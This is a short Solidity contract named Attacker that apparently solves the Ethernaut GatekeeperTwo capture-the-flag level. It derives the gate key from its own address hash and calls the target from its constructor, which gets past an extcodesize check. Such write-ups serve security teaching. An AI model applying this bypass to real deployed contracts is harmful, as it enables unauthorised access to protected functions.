// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract Attacker {
  
    constructor (address _target) {
        IGatekeeperTwo target = IGatekeeperTwo(_target);

        uint64 hash = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));

        bytes8 key = bytes8(hash ^ type(uint64).max);

        require(target.enter(key),"Failed");
    }
}

